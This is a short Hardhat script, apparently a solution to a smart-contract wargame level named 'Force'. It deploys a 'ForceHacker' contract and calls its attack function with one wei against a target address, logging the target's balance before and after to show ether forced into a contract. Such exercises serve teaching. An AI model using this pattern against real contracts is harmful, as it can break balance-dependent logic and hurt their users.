const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const ForceHacker = await ethers.getContractFactory("ForceHacker");
  const force_hacker = await ForceHacker.deploy();
  await force_hacker.deployed();
  console.log(force_hacker.address);

  const forceAddr = process.env.FORCE_ADDR;
  console.log(`force balance: ${await ethers.provider.getBalance(forceAddr)}`);
  const tx = await force_hacker.attack(forceAddr, { value: 1 });
  await tx.wait();
  console.log(tx.hash);
  console.log(`force balance: ${await ethers.provider.getBalance(forceAddr)}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
